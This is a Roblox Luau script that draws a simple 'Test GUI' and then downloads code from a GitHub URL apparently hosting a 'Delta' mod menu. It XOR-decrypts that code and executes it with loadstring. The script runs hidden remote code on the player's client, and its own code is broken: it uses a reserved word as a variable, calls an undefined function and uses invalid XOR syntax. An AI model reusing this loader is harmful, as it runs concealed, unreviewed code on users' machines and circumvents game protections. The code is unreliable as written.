local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Function to fetch and execute code from a URL
local function fetchAndExecuteCode(url)
    local success, response = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        -- Decrypt the fetched code
        local decryptedCode = decrypt(response)

        -- Execute the decrypted code
        local function, err = loadstring(decryptedCode)
        if function then
            coroutine.wrap(function()
                function()
            end)()
        else
            warn("Error loading string: " .. err)
        end
    else
        warn("Error fetching code from URL: " .. response)
    end
end

-- Function to decrypt the code
local function decrypt(encryptedCode)
    -- Simple XOR decryption example
    local key = "your_decryption_key" -- Ensure this matches the key used for encryption
    local decrypted = ""
    for i = 1, #encryptedCode do
        decrypted = decrypted .. string.char(string.byte(encryptedCode, i) ~ string.byte(key, i % #key + 1))
    end
    return decrypted
end

-- Function to create a basic GUI
local function createBasicGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "TestGui"
    gui.ResetOnSpawn = false
    gui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 200, 0, 100)
    frame.Position = UDim2.new(0.5, -100, 0.5, -50)
    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Text = "Test GUI"
    textLabel.TextSize = 24
    textLabel.Font = Enum.Font.SourceSans
    textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = frame
end

-- Execute the combined test
createBasicGui()
fetchAndExecuteCode("https://raw.githubusercontent.com/maurree/MobileScripts/refs/heads/main/DeltaModMenu.lua")
